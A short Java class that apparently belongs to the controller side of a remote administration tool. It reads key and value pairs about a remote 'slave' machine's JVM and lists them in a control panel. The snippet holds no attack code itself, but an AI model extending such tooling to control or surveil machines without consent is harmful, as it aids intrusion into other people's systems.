package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlJVM;

public class PacketJVM extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {
		String key = slave.readLine();
		String value = slave.readLine();
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		if (frame != null) {
			PanelControlJVM panel = (PanelControlJVM) frame.panels.get("jvm info");
			panel.getModel().addRow(new Object[] { key, value });
		}
	}

}
